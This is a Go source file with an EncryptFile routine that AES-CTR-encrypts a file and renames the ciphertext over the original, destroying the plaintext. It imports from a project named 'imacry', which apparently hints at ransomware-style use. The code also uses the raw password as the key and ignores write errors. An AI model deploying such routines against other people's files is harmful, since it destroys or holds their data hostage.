package encryptfile

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"

	"github.com/prairir/imacry/pkg/config"
)

type EncryptFile struct{}

func (ef EncryptFile) Do(filePath string) error {
	password := config.Config.Password
	// if password dont exist
	if password == "" {
		return fmt.Errorf("encryptfile.Do error: No password in config.Config")
	}

	cipherBlock, err := aes.NewCipher([]byte(password))
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	iv := make([]byte, cipherBlock.BlockSize())
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	// open file
	infile, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	// read file permissions
	inPerms, err := os.Stat(filePath)
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	// create a file to write to with the same name + ".enc" and the same perms
	outfile, err := os.OpenFile(filePath+".enc", os.O_WRONLY|os.O_CREATE, inPerms.Mode())
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	outfile.Write(iv)
	buf := make([]byte, 1024)
	stream := cipher.NewCTR(cipherBlock, iv)

	for {
		n, err := infile.Read(buf)
		if n > 0 {
			stream.XORKeyStream(buf, buf[:n])
			outfile.Write(buf[:n])
		}

		// if it gets EOF break out of loop
		if err == io.EOF {
			break
		}

		// if error isnt EOF
		if err != nil {
			return fmt.Errorf("encryptfile.Do error: %w", err)
		}
	}

	err = infile.Close()
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	err = outfile.Close()
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}

	err = os.Rename(filePath+".enc", filePath)
	if err != nil {
		return fmt.Errorf("encryptfile.Do error: %w", err)
	}
	return nil
}
